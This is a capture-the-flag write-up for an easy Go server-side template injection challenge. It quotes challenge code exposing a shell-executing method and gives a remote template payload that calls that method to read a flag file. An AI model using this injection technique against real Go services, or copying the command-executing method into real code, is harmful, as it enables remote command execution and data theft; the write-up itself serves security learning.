# Info
Difficulty: Easy
# Desc
> You've found a website that lets you input remote templates for rendering. Your task is to exploit this system's vulnerabilities to access and retrieve a hidden flag. Good luck!
# Writeup
This is a simple SSTI challenge. The flag has a random name, so getting a shell or code injection is required.
Although I'm not familliar with Go at all, I still can understand what the code is trying to do.

There are two render modes on the server, one is rendering local template file, another is rendering remote template file.
Also, the server is using `html/template` to render. The package dosen't have a native command executing method, but thankfully, the `RequestData` struct does have a method for executing system commands:
```go
type RequestData struct {
    ClientIP     string
    ClientUA     string
    ServerInfo   MachineInfo
    ClientIpInfo LocationInfo `json:"location"`
}

func (p RequestData) FetchServerInfo(command string) string {
    out, err := exec.Command("sh", "-c", command).Output()
    if err != nil {
        return ""
    }
    return string(out)
}
```

The tutorial in Hacktricks says we can use syntax like `{{.CustomAttribuesOrMethods}}` to access the passed object data.
The code has passed `RequestData` object to the template:
```go
err = tmpl.Execute(w, reqData)
```

Therefore, we can access the `FetchServerInfo` method in our template and execute system commands:
```
<!-- exp.tpl -->
{{.FetchServerInfo "cat /flagXXXXX.txt"}}
```